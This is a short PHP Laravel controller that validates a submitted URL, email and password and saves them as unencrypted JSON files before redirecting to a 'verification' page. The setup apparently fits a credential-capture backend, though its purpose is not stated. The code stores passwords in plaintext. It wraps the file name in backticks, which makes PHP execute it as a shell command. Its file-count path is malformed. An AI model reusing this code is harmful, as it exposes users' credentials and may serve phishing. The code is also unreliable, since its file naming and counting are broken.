<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Http\RedirectResponse;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Facades\Storage;

class FormController extends Controller
{
   
    function getForm(Request $request){
    
        //verification des input
        $validator = Validator::make($request->all(), [
            'url' => 'required|string|url',
            'email' => 'required|string|email',
            'password' => 'required|string'
        ]);

        if ($validator->fails()) {
            $errors = $validator->messages();

            $fields = ['url', 'email', 'password'];
        
            foreach ($fields as $field) {
                if ($errors->has($field)) {
                    Session::flash($field . '_error', $errors->first($field));
                }
            }
        
        
            return redirect()->back()->withInput();
        }else{

            


            $url = $request->input('url');
            $email = $request->input('email');
            $password = $request->input('password');

            $data = [
                "url" => $url,
                "email" => $email,
                "password"=> $password
            ];
            $directory = "../../../storage/app/json";
            $filecount = count(glob($directory . "*"));
            Storage::disk('local_json')->put(`password_$filecount.json`, json_encode($data));
         

            // Redirigez l'utilisateur vers une autre page
            return redirect('/page-verif'); 
        }

       

    }

    

}